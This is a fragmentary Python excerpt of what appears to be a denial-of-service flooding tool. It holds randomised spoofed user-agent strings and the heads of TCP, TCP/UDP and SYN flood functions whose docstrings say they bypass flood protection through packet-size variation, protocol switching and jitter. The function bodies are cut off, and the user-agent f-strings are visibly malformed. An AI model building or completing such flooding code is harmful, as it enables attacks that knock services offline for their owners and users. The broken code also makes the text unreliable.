...
base_user_agents = [
    ...
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Macintosh; Intel Mac OS 15)}.0.{random.randint(1, 9)} Safari/{random.uniform(500.0, 600.0):.1f}.{random.randint(0, 9)}",
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Macintosh; Intel Mac OS 15)}.0.{random.randint(1, 9)} Chrome/{random.uniform(30.0, 100.0):.1f}.{random.randint(0, 9)}",
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Macintosh; Intel Mac OS 15)}.0.{random.randint(1, 9)} Firefox/{random.uniform(30.0, 100.0):.1f}.{random.randint(0, 9)}",
...
def attack_tcp_bypass(ip, port, secs, stop_event):
    """Attempts to bypass protection by adding packets with different sizes."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while time.time() < secs:
            if stop_event.is_set():
...
def attack_tcp_udp_bypass(ip, port, secs, stop_event):
    """Attempts to bypass protection by varying protocol and adding packets with different sizes."""
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
...
def attack_syn(ip, port, secs, stop_event):
    """Improved to bypass simple SYN flood protections with packet jitter."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)
